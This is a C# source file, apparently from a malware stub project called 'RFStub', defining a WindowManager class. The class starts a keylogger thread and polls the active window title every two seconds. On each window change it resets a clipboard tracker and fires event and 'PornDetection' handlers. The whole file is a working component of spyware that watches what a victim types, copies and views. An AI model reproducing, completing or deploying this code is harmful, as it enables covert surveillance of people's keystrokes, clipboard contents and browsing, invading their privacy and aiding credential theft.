using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Keylogger;

namespace RFStub;

internal sealed class WindowManager
{
	public static string ActiveWindow;

	public static Thread MainThread = new Thread(Run);

	private static List<Action> functions = new List<Action>
	{
		EventManager.Action,
		PornDetection.Action
	};

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	private static string GetActiveWindowTitle()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowThreadProcessId(foregroundWindow, out var lpdwProcessId);
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			return text;
		}
		catch (Exception)
		{
			return "Unknown";
		}
	}

	private static void Run()
	{
		global::Keylogger.Keylogger.MainThread.Start();
		string text = "";
		while (true)
		{
			Thread.Sleep(2000);
			ActiveWindow = GetActiveWindowTitle();
			if (!(ActiveWindow != text))
			{
				continue;
			}
			text = ActiveWindow;
			ClipboardManager.PrevClipboard = "";
			foreach (Action function in functions)
			{
				function();
			}
		}
	}
}
